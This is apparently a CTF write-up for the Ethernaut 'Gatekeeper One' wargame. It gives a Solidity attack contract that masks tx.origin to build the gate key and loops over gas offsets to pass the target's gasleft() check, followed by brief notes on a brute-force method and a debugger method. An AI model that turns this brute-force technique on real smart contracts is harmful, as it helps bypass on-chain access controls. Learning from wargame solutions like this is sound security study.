```javascript
pragma solidity ^0.6.0;

contract GatekeeperOneAttack {
    function attack(address addr) public {
        bytes8 gate_key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        uint base_gas = 100000;
        bool success;
        for (uint i = 0; i < 8191; i++) {
          (success, ) = addr.call{ gas:base_gas+i }(abi.encodeWithSignature("enter(bytes8)", gate_key));
          if (success) {
            break;
          } 
        }
        require(success);
    }
}
```

This gas cost for this is quite expensive. Ideally, you would want to do this locally, but my setup is not working.

Method 1 (used here): Bruteforce the `gasleft()` value.

Method 2 (attempted): Go to Remix and use the debugger for the transaction, then see what's the remaining gas when the opcode gas is called. Finally, reverse engineer the initial gas amount to put into the call.
